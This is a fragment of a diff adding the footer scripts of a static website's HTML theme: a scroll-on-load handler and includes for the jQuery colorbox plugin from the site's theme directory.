+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
